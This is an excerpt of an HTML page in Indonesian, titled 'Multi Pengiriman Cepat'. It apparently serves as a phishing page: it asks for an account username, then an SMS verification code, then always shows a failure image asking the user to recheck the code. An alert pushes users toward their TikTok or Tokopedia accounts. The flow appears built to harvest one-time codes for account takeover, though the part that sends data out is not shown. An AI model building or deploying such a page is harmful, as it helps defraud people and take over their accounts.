...
<head>
    ...
    <title>Multi Pengiriman Cepat</title>
...
<body>
    ...
    <div class="wrapper" id="mainWrapper">
        ...
        <div id="bagian1" class="halaman">
            <div class="konten-form">
                ...
                <input type="text" id="inputNama" placeholder="alamat akun atau nama pengguna">
        ...
        <div id="bagian2" class="halaman">
            <div class="konten-form">
                ...
                <p>kode verifikasi dikirim melalui sms.</p>
                <input type="number" id="inputHobi" placeholder="Masukkan kode verifikasi">
            </div>
            <div class="tombol-container">
                <button onclick="tampilkanHasil()">Masuk</button>
            </div>
        </div>
        ...
        <div id="bagian3" class="halaman">
            <div class="konten-form">
                ...
                <p>Priksa kembali kode verifikasi ada dikirim melalui sms.</p>
                <img src="https://st2.depositphotos.com/1216158/6888/v/950/depositphotos_68884815-stock-illustration-red-cross-red-x-icon.jpg" alt="Foto Bagian 3">
            </div>
            <div class="tombol-container">
    ...
    <script>
        ...
        function tampilkanHasil() {
            ...
            if (hobi == "") {
                alert("Gunakan akun tiktok atau tokopedia apabila tidak mendapatkan kode verifikasi!");
                return;
            }
